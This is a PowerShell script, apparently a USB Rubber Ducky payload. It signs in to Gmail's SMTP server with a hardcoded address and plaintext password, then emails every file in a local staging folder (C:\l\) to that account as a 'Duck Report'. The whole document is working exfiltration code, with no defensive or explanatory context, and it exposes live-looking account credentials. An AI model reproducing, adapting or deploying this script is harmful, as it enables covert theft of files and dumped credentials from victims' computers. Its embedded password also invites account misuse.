$SMTPServer = 'smtp.gmail.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('mrleprecha1purplesentinel@gmail.com', '!@12qwaszx');
$ReportEmail = New-Object System.Net.Mail.MailMessage
$ReportEmail.From = 'mrleprecha1purplesentinel@gmail.com'
$ReportEmail.To.Add('mrleprecha1purplesentinel@gmail.com')
$ReportEmail.Subject = 'Duck Report'
$ReportEmail.Body = 'Attached is your duck report.... Quack' 
$files=Get-ChildItem "C:\l\"
Foreach($file in $files)
{
Write-Host "Attaching File :- " $file
$attachment = New-Object System.Net.Mail.Attachment –ArgumentList C:\l\$file
$ReportEmail.Attachments.Add($attachment)
$SMTPInfo.Send($ReportEmail)
}
write-host "Mail Sent Successfully"
